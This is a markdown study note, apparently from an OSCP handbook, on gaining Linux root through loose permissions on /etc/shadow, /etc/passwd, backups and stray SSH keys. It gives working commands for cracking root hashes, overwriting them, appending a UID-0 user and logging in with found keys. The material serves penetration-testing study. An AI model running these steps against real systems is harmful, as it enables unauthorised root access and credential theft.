---
title: "Weak File Permissions"
slug: weak-file-permissions
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-19T23:38:46+03:00
modDatetime: 2026-07-25T19:48:47+03:00
description: "Sensitive system files are protected by their permissions, not by secrecy."
---
Sensitive system files are protected by their permissions, not by secrecy. When those permissions are too loose, the file itself becomes the escalation. A root-owned file that is readable may leak a credential, and one that is writable can be edited to change how the system authenticates. The permission model behind this is in [Linux Permissions](/collections/oscp/linux-permissions). This note covers the files worth checking and how each one leads to root.

## Find Weak Permissions

```bash
# writable / readable files directly under /etc
find /etc -maxdepth 1 -writable -type f
find /etc -maxdepth 1 -readable -type f

# directories anywhere the current user can write into
find / -writable -type d 2>/dev/null
```

`/etc` holds the authentication files below, so start there. Writable directories matter because directory write permits replacing files inside, the basis of the [Cron Jobs](/collections/oscp/cron-jobs) vector.

## /etc/shadow

`/etc/shadow` holds the user password hashes and by default is readable only by root. Loose permissions on it go both ways.

Readable: extract the root hash and crack it offline.

```bash
ls -l /etc/shadow                 # -rw-r--rw-  => world readable
head -n 1 /etc/shadow             # root:$6$...:17298:0:99999:7:::
echo '$6$Tb/euwmK$OXA.dwM...I0' > hash.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
su                                # enter the cracked password
```

The `$6$` prefix is SHA-512 crypt, `$1$` is MD5, `$5$` SHA-256, `$y$` / `$2b$` yescrypt/bcrypt. Match John's `--format` to the prefix.

Correct permissions on `/etc/shadow` do not always protect it. Membership of the `disk` group reads the same hashes straight off the block device with `debugfs`, and the file mode never enters into it. See [Linux Groups](/collections/oscp/linux-groups).

Writable: skip cracking and overwrite the root hash with a known one.

```bash
cp /etc/shadow /tmp/shadow.bak    # back it up first to restore later
mkpasswd -m sha-512 newpassword   # generates a $6$ hash
# edit /etc/shadow, replace root's hash field with the generated one
su                                # log in as root with newpassword
```

## /etc/passwd

`/etc/passwd` is world-readable by design, but if it is writable it is a faster root than `/etc/shadow`. The second field is a legacy password slot: for backward compatibility, a hash there takes precedence over `/etc/shadow`.

```text
root:x:0:0:root:/root:/bin/bash
    ^ "x" means: look in /etc/shadow
```

Three ways to abuse a writable `/etc/passwd`:

```bash
# 1. put a known hash in root's password field (openssl uses legacy crypt)
openssl passwd "password"                 # -> L9yLGxncbOROc
# edit: root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
su                                        # password: password

# 2. append an alternate UID-0 user (works even with append-only access;
#    Linux allows multiple names sharing UID 0)
echo 'newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

# 3. on some systems, deleting the "x" makes root passwordless
# root::0:0:root:/root:/bin/bash  -> su root with no password
```

Option 2 is the reliable one under a webshell or restricted shell, since it only appends.

## Backups and Stray Keys

Even when the live files are locked down, a user may have made an insecure copy. Backups and misplaced keys are readable where the originals are not. Check the usual spots, including hidden files:

```bash
ls -la /home/*  /  /tmp  /var/backups
```

`/var/backups` often holds a copy of `/etc/shadow` or `/etc/passwd`. A stray SSH private key is the other common find:

```bash
ls -la /                          # a hidden /.ssh is out of place
head -n 1 /.ssh/root_key          # -----BEGIN RSA PRIVATE KEY-----
```

A root key needs root SSH login enabled and correct key permissions, or SSH refuses it:

```bash
grep PermitRootLogin /etc/ssh/sshd_config     # want: yes
chmod 600 root_key                            # copy to Kali first
ssh -i root_key root@TARGET
```

## Where This Sits

This is the concrete form of the "credentials at rest" step in the [Privilege Escalation](/collections/oscp/privilege-escalation-linux) triage: read the files a lax admin left open before reaching for an exploit. Cracking `/etc/shadow` also overlaps with the sudo file-read primitives in [Sudo](/collections/oscp/sudo), which can hand over the same hash even when the file itself is not world-readable. Passwords found in configs and history go through [Credential Hunting](/collections/oscp/credential-hunting).
